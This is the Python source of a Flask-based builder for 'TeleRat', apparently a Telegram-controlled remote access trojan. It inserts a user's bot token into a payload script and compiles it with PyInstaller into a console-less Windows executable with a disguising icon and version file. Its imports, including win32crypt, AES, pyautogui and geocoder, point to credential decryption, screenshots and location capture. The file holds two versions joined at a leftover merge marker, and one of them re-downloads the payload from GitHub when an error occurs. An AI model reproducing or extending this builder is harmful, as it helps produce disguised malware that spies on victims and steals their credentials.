import os,wget,PyInstaller,telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder
from telebot import types
from shutil import copyfile
from Crypto.Cipher import AES
from flaskwebgui import FlaskUI
from datetime import timezone, datetime, timedelta
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def welcome():
    return render_template("Build.html")

@app.route('/build',methods=['POST','GET'])
def output():
    start(request.form['key'])
    return render_template("Built.html")

def start(bot_token):
        with open('Source_Files/telerat.py', 'r') as file :
            filedata = file.read()
        if 'ENTER_YOUR_BOT_TOKEN_HERE' in filedata:
            filedata = filedata.replace('ENTER_YOUR_BOT_TOKEN_HERE',bot_token)
        with open('Source_Files/telerat.py', 'w') as file:
            file.write(filedata)


        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt --noconsole Source_Files/telerat.py')
        os.system('rd /s /q build')
        os.remove('telerat.spec')
        copyfile('dist/telerat.exe', 'telerat.exe')
        os.system('rd /s /q dist')


        with open('Source_Files/telerat.py', 'r') as file :
            filedata = file.read()
        if bot_token in filedata:
            filedata = filedata.replace(bot_token,'ENTER_YOUR_BOT_TOKEN_HERE')
        with open('Source_Files/telerat.py', 'w') as file:
            file.write(filedata)

if __name__ == '__main__':
    FlaskUI(app, width=360, height=590).run()
=======
import os,wget,pyinstaller
from shutil import copyfile
from flaskwebgui import FlaskUI
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def welcome():
    return render_template("Build.html")

@app.route('/build',methods=['POST','GET'])
def output():
    start(request.form['key'])
    return render_template("Built.html")

@app.errorhandler(500)
def internal_error(error):
    os.remove('Source_Files\telerat.py')
    wget.download('https://raw.githubusercontent.com/navin-hariharan/TeleRat/main/Source_Files/telerat.py','Source_Files\telerat.py')

@app.errorhandler(404)
def not_found(error):
    return render_template("Build.html")

def start(bot_token):
        with open('Source_Files/telerat.py', 'r') as file :
            filedata = file.read()
        if 'ENTER_YOUR_BOT_TOKEN_HERE' in filedata:
            filedata = filedata.replace('ENTER_YOUR_BOT_TOKEN_HERE',bot_token)
        with open('Source_Files/telerat.py', 'w') as file:
            file.write(filedata)


        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt --noconsole Source_Files/telerat.py')
        os.system('rd /s /q build')
        os.remove('telerat.spec')
        copyfile('dist/telerat.exe', 'telerat.exe')
        os.system('rd /s /q dist')


        with open('Source_Files/telerat.py', 'r') as file :
            filedata = file.read()
        if bot_token in filedata:
            filedata = filedata.replace(bot_token,'ENTER_YOUR_BOT_TOKEN_HERE')
        with open('Source_Files/telerat.py', 'w') as file:
            file.write(filedata)

if __name__ == '__main__':
    FlaskUI(app, width=360, height=590).run()
